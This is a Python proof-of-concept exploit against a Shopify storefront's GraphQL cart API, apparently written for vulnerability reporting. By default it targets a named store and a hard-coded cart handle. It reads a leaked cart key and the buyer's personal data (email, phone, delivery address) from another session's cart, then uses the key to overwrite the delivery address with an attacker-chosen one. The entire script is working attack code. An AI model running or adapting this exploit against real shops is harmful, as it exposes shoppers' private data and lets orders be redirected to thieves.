#!/usr/bin/env python3
# Shopify cart bare-handle -> cap key -> cross-session takeover (minimal POC)
import json, re, requests, sys
BASE = sys.argv[1] if len(sys.argv) > 1 else "https://retro-refresh.com"
HANDLE = sys.argv[2] if len(sys.argv) > 2 else "hWNJ25uPww3jlbw76I6y1DtA"
GQL = BASE + "/api/graphql"
H = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json", "Accept": "application/json"}
S = requests.Session(); S.cookies.clear()

PREPARE = 'mutation P($cartId:ID!){cartPrepareForCompletion(cartId:$cartId){result{__typename ... on CartStatusReady{cart{id note attributes{key value} buyerIdentity{email phone countryCode} delivery{addresses{id selected address{... on CartDeliveryAddress{firstName lastName address1 address2 city company provinceCode zip countryCode phone}}}}}} ... on CartStatusNotReady{cart{id note} errors{code}}} userErrors{field message code}}}'

def gql(tag, q, v):
    r = S.post(GQL, json={"query": q, "variables": v}, headers=H, timeout=40)
    print(tag, r.status_code, r.text[:1200]); return r.json()

def main():
    j = gql("prepare(bare handle)", PREPARE, {"cartId": f"gid://shopify/Cart/{HANDLE}"})
    res = j.get("data", {}).get("cartPrepareForCompletion", {}).get("result") or {}
    cart = res.get("cart") or {}
    print("\nLEAKED id:", cart.get("id"))
    print("PII:", json.dumps({k: cart.get(k) for k in ("buyerIdentity", "note", "delivery")}, ensure_ascii=False))
    m = re.search(r"\?key=([0-9a-f]+)", cart.get("id", ""))
    if not m:
        print("no leaked key"); return
    key = m.group(1)
    addr = (cart.get("delivery", {}).get("addresses") or [{}])[0]
    print("\n-> write with leaked key:", key)
    U = 'mutation U($cartId:ID!,$addresses:[CartSelectableAddressUpdateInput!]!){cartDeliveryAddressesUpdate(cartId:$cartId,addresses:$addresses){cart{delivery{addresses{id selected address{... on CartDeliveryAddress{firstName lastName address1 city zip countryCode phone}}}}} userErrors{field message code}}}'
    gql("address rewrite", U, {"cartId": f"gid://shopify/Cart/{HANDLE}?key={key}", "addresses": [{
        "id": addr.get("id"),
        "address": {"deliveryAddress": {"address1": "666 Redirect Lane", "address2": "Suite 6", "city": "Manchester",
            "company": "Verifier Labs", "countryCode": "GB", "firstName": "Verifier", "lastName": "PWN",
            "phone": "+447911123456", "provinceCode": "ENG", "zip": "M1 1AA"}},
        "selected": True}]})

if __name__ == "__main__":
    main()